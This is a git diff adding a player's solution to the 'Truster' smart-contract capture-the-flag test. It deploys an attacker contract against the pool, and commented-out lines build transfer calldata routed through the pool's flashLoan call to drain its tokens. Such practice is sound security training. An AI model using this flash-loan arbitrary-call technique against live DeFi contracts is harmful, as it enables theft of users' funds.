@@ -23,11 +23,25 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let balance = await token.balanceOf( player.address);
+        console.log( balance);
+
+        let attackerTruster = await (await ethers.getContractFactory('AttackerTruster', deployer)).deploy( token.address, pool.address);
+        // let playerAddr = player.address
+        // playerAddr= await ethers.utils.hexZeroPad(playerAddr, 32);
+        // let value= '0000000000000000000000000000000000000000000000000000000000001000'
+        // let call_data='0xa9059cbb'+playerAddr.slice(2)+value
+        // console.log({call_data})
+        // await pool.connect( player).flashLoan( 0, player.address, token.address, call_data);
+
+        await attackerTruster.connect( player).attack();
+        balance = await token.balanceOf( player.address);
+        console.log("Attack Truster balance: ", balance);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-
+        
         // Player has taken all tokens from the pool
         expect(
             await token.balanceOf(player.address)
